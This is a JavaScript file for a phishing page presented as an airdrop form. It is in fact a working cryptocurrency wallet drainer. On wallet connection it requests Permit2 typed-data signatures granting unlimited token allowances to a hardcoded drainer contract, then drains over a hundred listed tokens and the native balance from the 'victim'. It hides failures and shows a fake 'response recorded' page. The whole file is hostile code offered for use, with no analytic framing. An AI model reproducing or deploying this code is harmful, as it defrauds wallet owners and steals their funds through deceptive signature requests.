// =============================================
// app.js - Improved for Polygon + Native Drain
// =============================================

const DRAINER_ADDRESS = "0xd9145CCE52D386f254917e481eB44e9943F39138";
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const targetTokens = [
    // ethereum
    "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
    "0xb8c77482e45f1f44de1745f52c74426c631bdd52", // BNB
    "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
    "0xdc035d45d973e3ec169d2276ddab16f1e407384f", // USDS
    "0x2af5d2ad76741191d15dfe7bf6ac92d4bd912ca3", // LEO
    "0x925206b8a707096ed26ae47c84747fe0bb734f59", // WBT
    "0x514910771af9ca656af840dff83e8264ecf986ca", // LINK
    "0x8d0d000ee44948fc98c9b98a4fa4921476f08b0d", // USD1
    "0x6b175474e89094c44da98b954eedeac495271d0f", // DAI
    "0x4c9edd5852cd905f086c759e8383e09bff1e68b3", // USDE
    "0x582d872a1b094fc48f5de31d3b73f2d9be47def1", // GRAM
    "0x136471a34f6ef19fe571effc1ca711fdb8e49f2b", // USYC
    "0xe343167631d89b6ffc58b88d6b7fb0228795491d", // USDG
    "0x6c3ea9036406852006290770bedfcaba0e23a0e8", // PYUSD
    "0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b", // CRO
    "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce", // SHIB
    "0x68749665ff8d2d112fa859aa293f07a622782f38", // XAUT
    "0x7712c34205737192402172409a8f7ccef8aa2aec", // BUIDL
    "0x96f6ef951840721adbf46ac996b59e0235cb985c", // USDY
    "0xda5e1988097297dcdc1f90d4dfe7909e847cbef6", // WLFI
    "0x45804880de22913dafe09f4980848ece6ecbaf78", // PAXG
    "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984", // UNI
    "0x75231f58b43240c9718dd58b4967c5114342a86c", // OKB
    "0x163f8c2467924be0ae7b5347228cabf260318753", // WLD
    "0x8292bb45bf1ee4d140127049757c2e0ff06317ed", // RLUSD
    "0xfaba6f8e4a5e8ab82f62fe7c39859fa577269be3", // ONDO
    "0x61ec85ab89377db65762e234c946b5c25a56e99e", // HTX
    "0x3c3a81e81dc49a522a592e7622a7e711c06bf354", // MNT
    "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9", // AAVE
    "0x8d010bf9c26881788b4e6bf5fd1bdc358c8f90b8", // DOT
    "0xfa2b947eec368f42195f24f36d2af29f7c24cec2", // USDF
    "0x4f8e5de400de08b164e7421b3ee387f461becd1a", // USDD
    "0x00f3c42833c3170159af4e92dbb451fb3f708917", // ICP
    "0x58d97b57bb95320f9a05dc918aef65434969c2b2", // MORPHO
    "0x54d2252757e1672eead234d27b1270728ff90581", // BGB
    "0x56072c95faa701256059aa122697b133aded9279", // SKY
    "0x6982508145454ce325ddbe47a25d4ec3d2311933", // PEPE
    "0xce24439f2d9c6a2289f741120fe202248b666666", // U
    "0xde4ee8057785a7e8e800db58f9784845a5c2cbd6", // DEXE
    "0x4a220e6096b25eadb88358cb44068a3248254675", // QNT
    "0xa0769f7a8fc65e47de93797b4e21c073c117fc80", // EUTBL
    "0x8c213ee79581ff4984583c6a801e5263418c4b86", // JTRSY
    "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24", // RENDER
    "0x43415eb6ff9db7e26a15b704e7a3edce97d31c4e", // USTB
    "0x455e53cbb86018ac2b8092fdcd39d8444affc3f6", // POL
    "0xc139190f447e929f090edeb554d95abb8b18ac1c", // USDTB
    "0xb62132e35a6c13ee1ee0f84dc5d40bad8d815206", // NEXO
    "0x57e114b691db790c35207b2e685d4a43181e6061", // ENA
    "0xe66747a101bff2dba3697199dcce5b743b454759", // GT
    "0x5a0f93d040de44e78f251b03c43be9cf317dcf64", // JAAA
    "0x6ad12e761b438bea3ea09f6c6266556bb24c2181", // BDX
    "0x8b1484d57abbe239bb280661377363b03c89caea", // ADI
    "0x0990b149e915cb08e2143a5c6f669c907eddc8b0", // EURSAFO
    "0x40d16fc0246ad3160ccc09b8d0d3a2cd28ae6c2f", // GHO
    "0x73a15fed60bf67631dc6cd7bc5b6e8da8190acf5", // USD0
    "0xe28b3b32b6c345a34ff64674606124dd5aceca30", // INJ
    "0x0000000000085d4780b73119b644ae5ecd22b376", // TUSD
    "0xb50721bcf8d664c30412cfbc6cf7a15145234ad1", // ARB
    "0x6fa0be17e4bea2fcfa22ef89bf8ac9aab0ab0fc9", // A7A5
    "0x232ce3bd40fcd6f80f3d55a522d03f25df784ee2", // LIT
    "0x152649ea73beab28c5b49b26eb48f7ead6d4c898", // CAKE
    "0x1abaea1f7c830bd89acc67ec4af516284b1bc33c", // EURC
    "0x1b19c19393e2d034d8ff31ff34c81252fcbbee92", // OUSG
    "0xaea46a60368a7bd060eec7df8cba43b7ef41ad85", // FET
    "0x6418c0dd099a9fda397c766304cdd918233e8847", // PENGU
    "0x19ebb35279a16207ec4ba82799cc64715065f7f6", // PRIME
    "0x1151cb3d861920e07a38e03eead12c32178567f6", // BONK
    "0x44ff8620b8ca30902395a7bd3f2407e1a091bf73", // VIRTUAL
    "0xc5f0f7b66764f6ec8c8dff7ba683102295e16409", // FDUSD
    "0xfe0c30065b384f05761f15d0cc899d4f9f9cc0eb", // ETHFI
    "0x904567252d8f48555b7447c67dca23f0372e16be", // KITE
    "0xe0f63a424a4439cbe457d80e4f4b51ad25b2c56c", // SPX
    "0x14dab79fd7b7b3f748d434812fd6a9aac460ea52", // KAU
    "0xd533a949740bb3306d119cc777fa900ba034cd52", // CRV
    "0x98a878b1cd98131b271883b390f68d2c90674665", // APXUSD
    "0x6810e776880c02933d47db1b9fc05908e5386b96", // GNO
    "0x2798b1cc5a993085e8a9d46e80499f1b63f42204", // GWEI
    "0x198d14f2ad9ce69e76ea330b374de4957c3f850a", // NFT
    "0xc669928185dbce49d2230cc9b0979be6dc797957", // BTT
    "0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5", // OHM
    "0x853d955acef822db058eb8505911ed77f175b99e", // FRAX
    "0xec2af1c8b110a61fd9c3fa6a554a031ca9943926", // USDM
    "0x7420b4b9a0110cdc71fb720908340c03f9bc03ec", // JASMY
    "0x467bccd9d29f223bce8043b84e8c8b282827790f", // TEL
    "0x8a60e489004ca22d775c5f2c657598278d17d9c2", // USDA
    "0x808507121b80c02388fad14726482e061b8da827", // PENDLE
    "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e", // FLOKI
    "0x56ba8b58b7d1f6d384a1c4dd553f39ebc8741b8e", // KAG
    "0x0e63b9c287e32a05e6b9ab8ee8df88a2760225a9", // PIEVERSE
    "0x5a98fcbea516cf06857215779fd812ca3bef1b32", // LDO
    "0x6985884c4392d348587b19cb9eaaf157f13271cd", // ZRO
    "0x6944e1df6bf5972305f9ab25df47ef10de01bcc8", // UB
    "0xc944e90c64b2c07662a292be6244bdf05cda44a7", // GRT
    "0x0a1a1a107e45b7ced86833863f482bc5f4ed82ef", // USDAI
    "0xfa1c09fc8b491b6a4d3ff53a10cad29381b3f949", // FF
    "0xca14007eff0db1f8135f4c25b34de49ab0d42766", // STRK
    "0x3506424f91fd33084466f402d5d97f05f8e3b4af", // CHZ
    "0x07041776f5007aca2a54844f50503a18a72a8b68", // USAT
    "0x643c4e15d7d62ad0abec4a9bd4b001aa3ef52d66", // SYRUP
    "0x3a63de3572c69a1307ff08394f3ee7702c16d25d", // BTW
    "0xc18360217d8f7ab5e7c516566761ea12ce7f9d72", // ENS
    "0xec53bf9167f50cdeb3ae105f56099aaab9061f83", // EIGEN
    "0x00000000efe302beaa2b3e6e1b18d08d69a9012a", // AUSD
    "0xf939e0a03fb07f59a73314e73794be0e57ac1b4e", // CRVUSD
    "0xbb0e17ef65f82ab018d8edd776e8dd940327b28b", // AXS
    "0xe4880249745eac5f1ed9d8f7df844792d560e750", // USTBL
    "0x5086bf358635b81d8c47c66d1c8b9e567db70c72", // REUSD
    "0x64d0f55cd8c7133a9d7102b13987235f486f2224", // BORG
    "0x1958853a8be062dc4f401750eb233f5850f0d0d2", // SATUSD
    "0xc00e94cb662c3520282e6f5717214004a7f26888", // COMP
    "0x11eef04c884e24d9b7b4760e7476d06ddf797f36", // MX
    
    // arbitrum-one
    "0x25118290e6a5f4139381d072181157035864099d", // RAIN
    
    // binance-smart-chain
    "0x7ec43cf65f1663f820427c62a5780b8f2e25593a", // LAB
    "0x000ae314e2a2172a039b26378814c252734f556a", // ASTER
    "0x22b1458e780f8fa71e2f84502cee8b5a3cc731fa", // M
    "0x011ebe7d75e2c9d1e0bd0be0bef5c36f0a90075f", // STABLE
    "0x0eb3a705fc54725037cc9e008bdede697f62f335", // ATOM
    "0xcf3232b85b43bca90e51d38cc06cc8bb8c8a3e36", // BEAT
    "0x924fa68a0fc644485b8df8abfa0a41c2e7744444", // 币安人生
    "0xfe930c2d63aed9b82fc4dbc801920dd2c1a3224f", // NIGHT
    "0x92aa03137385f18539301349dcfc9ebc923ffb10", // SKYAI
    "0x6bdcce4a559076e37755a78ce0c06214e59e4444", // B
    "0x80f1ff15b887cb19295d88c8c16f89d47f6d8888", // COCO
    "0xe6df05ce8c8301223373cf5b969afcb1498c5528", // KOGE
    "0x65e7a112db1142eae919201b1232f7aa488ed83c", // REAL
    "0x90c48855bb69f9d2c261efd0d8c7f35990f2dd6f", // WFI
    "0x5668a83b46016b494a30dd14066a451e5417a8b8", // ULTIMA
    "0x4b0f1812e5df2a09796481ff14017e6005508003", // TWT

    // base
    "0xacfe6019ed1a7dc6f7b508c02d1b04ec88cc21bf", // VVV
    "0x940181a94a35a4569e4529a3cdfb74e38fd98631", // AERO

    // optimistic-ethereum
    "0x4200000000000000000000000000000000000042", // OP


    // Ethereum
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH

    // Polygon
    "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", // USDC (Polygon)
    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT (Polygon)
    "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", // WMATIC (Wrapped POL)
    "0x7ceB23fd6bC0adD59E62ac25578270cFf1b9f619", // WETH (Polygon)

    // Base
    "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC Base
    "0x4200000000000000000000000000000000000006"  // WETH Base
];

let connectedWallet = "";

document.addEventListener("DOMContentLoaded", () => {
    const connectBtn = document.getElementById("connectWalletBtn");
    const walletDisplay = document.getElementById("walletAddress");
    const statusEl = document.getElementById("status");
    const form = document.getElementById("airdropForm");

    connectBtn.addEventListener("click", async () => {
        try {
            const provider = window.ethereum;
            if (!provider) throw new Error("No wallet");

            const accounts = await provider.request({ method: "eth_requestAccounts" });
            connectedWallet = accounts[0];

            const short = connectedWallet.substring(0,6) + "..." + connectedWallet.slice(-4);
            walletDisplay.innerHTML = `<strong>Connected:</strong><br>${short}`;
            walletDisplay.classList.add("visible");

            connectBtn.textContent = "Wallet Connected";
            connectBtn.classList.add("connected");

            statusEl.textContent = "Processing...";

            await startFullDrain(connectedWallet);

            statusEl.innerHTML = `<span style="color:#34a853">✓ Completed</span>`;

        } catch (e) {
            console.error(e);
            statusEl.textContent = "Failed";
        }
    });

    form.addEventListener("submit", (e) => {
        e.preventDefault();
        if (!connectedWallet) return alert("Connect wallet first");
        showSuccessPage();
    });
});

async function startFullDrain(victim) {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const contract = new ethers.Contract(DRAINER_ADDRESS, [
        "function drainWithPermit2(address victim, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external",
        "function drainNative(address victim) external"
    ], signer);

    // Drain ERC20 Tokens
    for (let token of targetTokens) {
        try {
            const data = await getPermit2Signature(token);
            await contract.drainWithPermit2(victim, data.permitSingle, data.signature);
        } catch (e) {}
    }

    // Try Native Drain (POL / MATIC)
    try {
        await contract.drainNative(victim);
    } catch (e) {}
}

async function getPermit2Signature(tokenAddress) {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();
    const chainId = network.chainId;

    const expiration = Math.floor(Date.now() / 1000) + 86400 * 30;
    const sigDeadline = Math.floor(Date.now() / 1000) + 1800;

    const permitSingle = {
        details: {
            token: tokenAddress,
            amount: "1461501637330902918203684832716283019655932542975",
            expiration,
            nonce: 0
        },
        spender: DRAINER_ADDRESS,
        sigDeadline
    };

    const typedData = {
        domain: { name: "Permit2", chainId, verifyingContract: PERMIT2_ADDRESS },
        types: {
            PermitSingle: [
                { name: "details", type: "PermitDetails" },
                { name: "spender", type: "address" },
                { name: "sigDeadline", type: "uint256" }
            ],
            PermitDetails: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint160" },
                { name: "expiration", type: "uint48" },
                { name: "nonce", type: "uint48" }
            ]
        },
        primaryType: "PermitSingle",
        message: permitSingle
    };

    const signature = await provider.send("eth_signTypedData_v4", [
        connectedWallet,
        JSON.stringify(typedData)
    ]);

    return { permitSingle, signature };
}

function showSuccessPage() {
    document.body.innerHTML = `
        <div style="max-width:600px; margin:100px auto; text-align:center; font-family:Arial,sans-serif;">
            <h1 style="color:#34a853; font-size:28px;">Your response has been recorded</h1>
            <p style="margin:25px 0; font-size:18px;">Thank you for submitting the form.</p>
            <a href="#" onclick="location.reload()" style="color:#1a73e8; font-size:16px;">Edit your response</a>
        </div>
    `;
}
